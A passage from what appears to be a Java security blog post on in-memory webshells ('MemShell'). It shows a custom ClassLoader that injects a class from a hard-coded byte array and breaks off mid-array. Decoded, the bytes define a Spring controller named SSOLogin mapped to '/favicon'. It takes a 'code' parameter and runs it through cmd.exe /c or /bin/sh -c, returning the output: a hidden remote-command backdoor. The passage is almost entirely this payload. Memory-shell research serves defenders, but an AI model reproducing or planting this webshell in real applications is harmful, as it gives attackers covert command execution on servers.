me the code"></a>Show me the code</h3><a id="more"></a><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">(ClassLoader parent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Class <span class="title">loadClass</span><span class="params">(String name)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="string">&quot;reflection.MyObject&quot;</span>.equals(name))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//                        String url = &quot;file:/Users/mody/study/java/MemShell/SpringDemo/target/test-classes/org/m0d9/sec/SpringDemo/SSOLogin.class&quot;;</span></span><br><span class="line"><span class="comment">//                        URL myUrl = new URL(url);</span></span><br><span class="line"><span class="comment">//                        URLConnection connection = myUrl.openConnection();</span></span><br><span class="line"><span class="comment">//                        InputStream input = connection.getInputStream();</span></span><br><span class="line"><span class="comment">//                        ByteArrayOutputStream buffer = new ByteArrayOutputStream();</span></span><br><span class="line"><span class="comment">//                        int data = input.read();</span></span><br><span class="line"><span class="comment">//                        while(data != -1)&#123;</span></span><br><span class="line"><span class="comment">//                            buffer.write(data);</span></span><br><span class="line"><span class="comment">//                            data = input.read();</span></span><br><span class="line"><span class="comment">//                        &#125;</span></span><br><span class="line"><span class="comment">//                        input.close();</span></span><br><span class="line"><span class="comment">//                        byte[] classData = buffer.toByteArray();</span></span><br><span class="line"><span class="comment">//                        System.out.println(Arrays.toString(classData));</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] classData = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">0</span>, -<span class="number">125</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">81</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">94</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">95</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">97</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">109</span>, <span class="number">48</span>, <span class="number">100</span>, <span class="number">57</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">68</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">79</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">119</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">86</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">65</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">107</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">79</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">107</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">121</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">103</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">105</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">106</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">107</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">119</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">45</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">113</span>, <span class="number">0</span>, <span class="number">114</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">115</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">117</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">118</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">92</span>, <span class="number">65</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">119</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">121</span>, <span class="number">0</span>, <span class="number">122</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">0</span>, <span class="number">109</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">124</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">125</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">0</span>, <span class="number">127</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">128</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">127</span>, <span class="number">0</span>, -<span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">109</span>, <span class="number">48</span>, <span class="number">100</span>, <span class="number">57</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">68</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">79</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">80</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span 